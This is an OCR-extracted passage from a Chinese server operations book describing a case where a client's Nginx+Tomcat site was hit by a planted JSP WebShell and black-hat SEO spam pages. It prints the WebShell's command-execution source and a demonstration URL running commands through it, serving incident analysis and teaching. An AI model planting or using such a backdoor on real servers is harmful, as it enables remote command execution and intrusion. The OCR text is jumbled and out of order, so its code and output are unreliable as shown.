运维常见应用故障案例
可执行如下命令：
第9章
395
---
## Page 407
整体运行状态，如图10-1所示。
登录到Nginx服务器上，连接速度还是很快的，登录上去后，先执行 top 命令检查下系统
看来确实是网站打不开了。
笔者还是要自已测试一下。于是打开浏览器、输入域名，网站久久不能打开，直到超时。
10.1.2网站漏洞被植人WebShell过程分析
断方向。
描述，笔者赶紧赶到客户现场排查问题。
么发生的，之前做了什么操作等。客户回答“什么都没做，突然就不行了。”听了客户的
10.1.1客户网站突然无法访问
如入侵检测工具Chkrootkit、RKHunter、ClamAV等的使用方法和技巧。
后的处理措施以及遭受 SYNFlood、CC攻击的安全防范措施。还介绍了一些安全工具，
十
故障案例，云主机被植入挖矿病毒案例，网络遭受DDos带宽攻击案例，服务器遭受攻击
10.1
通过现场与客户的沟通，以及客户给出的各种现象描述，得出了对此问题的如下几个判
这是一个CentOS6.9的系统，Nginx服务器的硬件配置是32GB 内存，2颗8核物理
开始登录客户服务器进行故障诊断，客户网站的架构是Nginx+Tomcat，首先通过SSH
作为一个运维老将，笔者的一贯思路就是眼见为实，虽然客户说网站不能访问了，但
1.初步排查
》网站访问很慢，基本打不开，所以客户就认为宕机了，但是此时服务和服务器可
》网站无法访问了，可能是服务宕了，也可能是服务器宕机了。
笔者曾接到客户的电话，被告知说他们的网站平台突然无法访问了，于是便询问是怎
带着这些疑问，笔者开始了故障排查工作。
本章主要介绍Linux作为服务器的安全运维案例，介绍了网站被植入WebShell导致
客户自身网络问题，
能还处于启动状态。
第10章
网站被植入WebShell案例与Web安全防范策略
或者DNS问题。
服务器安全运维案例
---
## Page 408
端的 Nginx做负载均衡整合，对外提供Web 服务。
置还是软件部署环境，都完全一致，也就是两台Tomcat 启动了6个Tomcat 实例，通过前
是一个独立的服务。再去查看第2台Tomcat物理服务器，发现与现在这个无论是硬件配
最后关注到启动Java进程的是apsds这个普通用户。
程，每个进程占用CPU资源都在100%以上，并且一直持续了几个小时，这里有些异常。
内存，可用的仅剩下200MB左右，虽然缓存了48GB左右。另外可以看到有3个Java进
如图10-2所示。
务器的问题。
负载在30%～40%之间。整体来看，系统资源还是比较充足的。初步判断，不是Nginx服
充足，缓存了不少内存，这部分都是可以使用的。另外16个Nginx进程每个平均占用CPU
在另外两台独立的服务器上，硬件配置为2颗8核物理CPU，64GB内存。
CPU，Nginx 通过负载均衡将动态、静态请求发送给后端的多个 Tomcat上，Tomcat 运行
继续查看，发现这3个Java 进程其实是启动了3个Tomcat 实例，每个Tomcat实例都
接着，继续登录到 Tomcat 所在的服务器，仍然通过top 命令查看系统整体资源状态，
Tomcat服务器也是CentOX6.9的系统，系统整体负载偏高（最高14），64GB的物理
从图中可以看出，服务器CPU资源有一定负载，但是不高，32GB的内存资源还比较
PIDUSER
top-17:12:00
920
32767992k:total
22
2
14084k total
图10-2通过top命令查看Tomcat服务器运行状态
图10-1通过top命令查看Nginx服务器运行状态
total.
46days,
VIRT
1718m
1716m
C
3336184kused,
0.0%
RES
1:55
0:5
05
）厂
785r
luser
209
03
SHRS
0stoppec
S XCPU XMEM
29431808k free
266608k
oadavera
%owa,
1000
0.0
107.6
127.0
%CPU
0.0%h
age14.00,8.26.4.46
%MEM
ombie
00
IME
服务器安全运维案例第10章
0.1%si
七
TIME+
66:10.91
-23
5:Q1.37
1633200k
34.97
0.0%st
kswapdt
java
COMMAND
jlush-8:32
397
---
## Page 409
398
览器访问996.html文件，看到如图10-5所示内容。
通，确认这些以 html 结尾的静态文件以及1.jsp 文件都不是网站本身生成或使用的。那么，
为在静态页面目录下是不可能放一个jsp文件的。经过对客户的咨询以及与研发人员的沟
gk开头，是客户网站自动生成的正常文件，另外还有很多以html结尾的静态文件，这些
htm目录后，
不可能这么高。
有300多万次访问。这明显不正常，因为客户网站平时的访问量都在10万次以内，根本
的页面扩展名是.htm的，而不是.html。查看966.html这个页面的访问次数可知，一天时间
志的查看发现了一些异常，因为有很多不熟悉的静态页面被访问，如图10-3所示。
先来看看这些文件的内容。
文件不清楚是怎么来的。此外，还看到有个1.jsp 的文件，这个就更让人觉得奇怪了，因
问量都很大，于是，就到/htm/966.html对应的网站目录下一探究竟。进入网站根目录下的
力集中在Tomcat服务器上。重新登录Tomcat机器，查看Tomcat访问日志，通过对日
高性能Linux服务器运维实战：shell编程、监控告警、性能优化与实战案例
首先查看以html结尾的静态文件内容是什么。
接着，继续查看访问日志，发现类似966.html的这种页面访问非常多，每个页面的访
这个目录是网站生成的静态页面目录，可以看到有基于htm的静态页面，这些页面以
图10-3中页面966.html感觉有问题，因为客户的网站静态页面是自动生成的，生成
通过简单的一遍服务器状态过滤，发现可能出问题的是Tomcat服务器，于是将精
2.第二次排查
又发现了一些异常，如图10-4所示。
图10-4在Tomcat服务器上发现大量htm静态文件
图10-3查看Tomcat服务器访问日志
logs]#
，这里就以996.html文件为例，通过浏
---
## Page 410
eamReader(process.getInputStream()));
件内容如下（代码仅供学习，请勿其他用途）：
问题非常严重。接着，继续打开1.jsp 这个文件，看看这个文件中到底是什么内容，此文
我们看到的是百度中奖查询，此时笔者第一反应是：网站被植入WebShell了。看来
 processList=new ArrayList();
Process process = null;
System.out.println(cmd);
String cmd = request.getParameter("cmd");
import="java.io.BufferedReader"%>
import="java.io.InputStreamReader"%>
import="java.io.IOException"%>
3名词术语
1概述简介
分类频道
1
新国网质贴吧知造音乐图片现地图百科文库
if
String line ="";
(cmd!=null）{
特色百科·
input.close(）;
while（（line =input.readLine())!=null)
process =Runtime.getRuntime().exec(cmd);
processList.add(line);
图10-5被植入的广告页面
玩转自科，
百科册户，
百科校园
进入条搜索训条边
白科合作
服务器安全运维案例
客服中心系统
总部指定客服：中奖查询
原乳文化博物馆
手机百科
个人中心
第10章
399
---
## Page 411
搜索引擎收录了，单击搜索出来的任意一个页面，内容如图10-9所示。
录进行修改、删除操作，
是以root用户启动的话，那问题就更严重了，因为这个1.jsp可以对系统下任意文件或目
apsds启动的，所以通过这个1jsp只能在apsds用户权限下进行添加、删除操作。如果Tomcat
图10-7所示地址。
都能正常执行，这就是浏览器下的命令行。再执行一个写操作看看，
打开浏览器，访问：http://ip/htm/1.jsp?cmd=ls /，如图10-6所示。
高性能Linux服务器运维实战：shell编程、监控告警、性能优化与实战案例
400
又来了。笔者在查询客户网站搜索权重的时候，出现了新的问题，如图10-8所示。
ansibleabindatdaadetblixiimprtunbinsyturwbd
这是搜索引擎搜索到的客户网站内容，很明显，客户网站被植入了非法内容，然后被
到此为止，好像问题正在逐渐浮出水面。但是，这个问题还没完全搞清楚，新的问题
显示的是服务器根目录，然后将cmd-后面的字符替换成任意Linux下可执行的命令，
稍懂程序的人都能看出，这是一个WebShell木马后门程序。现在来试试它能干什么。
可以看到，成功写入文件。
然后去服务器查看，操作如下：
rw-r--
[apsds@tomcatserverl htm]$ 1l test.html
/usr/local/tomcat/webapps/RooT/htm
[apsds@tomcatserverl htm]s pwd
lelse{
if (s.equals（"")){
for (String line : processList) [
String S =: ;
out.write("null");
图10-7通过浏览器执行WebShell写入文件到服务器
out.write(s);
S += line + "\n";
1 apsds apsds
e.printStackTrace();
，其实相当于浏览器的root权限操作了。
图10-6通过浏览器访问木马文件截图
：不过，比较幸运的是，因为Tomcat进程是通过普通用户
010月1610:57
/htm/1
test.html
pps/ROOT/htm/test.html
，在浏览器访问如
---
## Page 412
交给Tomcat 来处理，当出现大量静态请求时，可能会导致Tomcat无法响应。因为Tomcat
索引擎有关呢？笔者整理了一下思路，得出如下结论。
字，应该是黑帽 SEO 的手段。这里说到了搜索引擎，
5）客户的网站是Nginx+多个Tomcat实现的负载均衡，所有动态、静态页面请求都
4）大量广告、推销网页被搜索引擎抓取，导致网站访问量激增。
3）
2）
1）网站应该有程序漏洞，在互联网被扫描到后注入了WebShell。
经过分析可以发现，这个页面的部分内容被替换了，替换的内容都是一些网站的关键
Google
因为网站（gov网站）权重比较高，所以搜索引擎比较喜欢来访。
黑客通过WebShell植入了大量广告、推销网页。
当前位置
首费数务乐虎际质>正文
和社会
依法调取准确锁定关键证据-画自治州人民乐虎国际-乐虎国际，乐
推动质量提升领跑质量时代。疾自治州人民乐虎国际一乐虎国际,乐
获得10条结果（用时0.17秒）
site：www.ov.cn乐虎
《规得）根据《境划》，我区将实瑰经始产业三年帮动10万人爱业的目标。
布机
首页乐虎国际概况
26日
新闻地图规质
民乐虎国际
图10-9网站页面被植入非法内容
图10-8搜索网站的收录信息
让更多人吃上“旅游饭”
乐虎国际首
更多
物
发文日翻
主紫分类
策
服务
突然意识到，此次的故障是否跟搜
2018-09-1910:2729
互动数据政务信息
服务器安全运维案例第10章
设置
首工
401
---
## Page 413
402
in
这很明显是Tomcat无法响应请求导致的。那么就来看看Tomcat服务器上的连接数情况：
这个蜘蛛，如图10-10所示。
取的量最大，正常来说，蜘蛛不应该抓取这么频繁。于是笔者简单搜索了一下YisouSpider